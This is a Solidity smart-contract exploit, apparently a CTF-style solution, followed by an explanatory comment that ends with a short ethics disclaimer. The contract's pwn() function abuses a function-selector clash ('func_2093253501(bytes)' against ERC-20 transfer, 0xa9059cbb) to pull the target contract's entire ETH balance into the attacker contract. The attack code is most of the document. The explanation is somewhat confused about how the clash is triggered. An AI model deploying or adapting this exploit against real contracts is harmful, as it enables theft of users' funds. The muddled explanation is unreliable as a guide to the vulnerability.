// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract FunctionSelectorClashExploit {
    address public immutable target;

    constructor(address _target) {
        target = _target;
    }

    // Receive ETH from target
    receive() external payable {}

    function pwn() external {
        // Both "transfer(address,uint256)" and "func_2093253501(bytes)"
        // have the same function selector
        // 0xa9059cbb

        // Attempt to call the target contract using the same function selector
        // and parameters as "transfer(address,uint256)"
        (bool ok, ) = target.call(
            abi.encodeWithSignature(
                "execute(string,bytes)",
                "func_2093253501(bytes)",
                abi.encode(address(this), target.balance)
            )
        );
        
        // Check if the call was successful, and if not, revert the transaction
        require(ok, "pwn failed");
    }
}

/*
Here's the explanation of the code:

1. The "FunctionSelectorClashExploit" contract is designed to exploit a function selector clash vulnerability in another contract, referred to as the "target" contract. It takes the address of the "target" contract as an argument during deployment and stores it as an immutable variable.

2. The contract includes a `receive` function, which allows it to receive Ether when the "target" contract sends Ether to this contract.

3. The "pwn" function is where the exploit is attempted. It performs the following steps:
   - It attempts to call a function on the "target" contract using the `target.call` function.
   - The `abi.encodeWithSignature` function is used to generate the function call data. It specifies the function signature as a string ("execute(string,bytes)") and encodes the arguments accordingly.
   - In this case, the function signature provided ("func_2093253501(bytes)") deliberately clashes with the function selector of the "transfer(address,uint256)" function, which is commonly found in ERC-20 token contracts. The function selector "0xa9059cbb" corresponds to both functions.
   - The parameters provided to the function call encode the address of the current contract (`address(this)`) and the balance of the "target" contract (`target.balance`).
   - The result of the call is captured in the `ok` boolean variable.

4. After attempting the call, the code checks if the call was successful (`ok == true`). If the call failed, it reverts the transaction with the error message "pwn failed."

The purpose of this contract is to trigger the function selector clash vulnerability in the "target" contract, potentially leading to unexpected behavior or exploitation. Function selector clashes can be dangerous, as they may cause contracts to execute unintended functions. However, the impact of such clashes depends on the specific logic and vulnerabilities present in the "target" contract.

Please note that exploiting vulnerabilities in contracts without proper authorization is unethical and likely to be against the terms of service of the blockchain platform. It's essential to use your knowledge responsibly and for legitimate purposes.
*/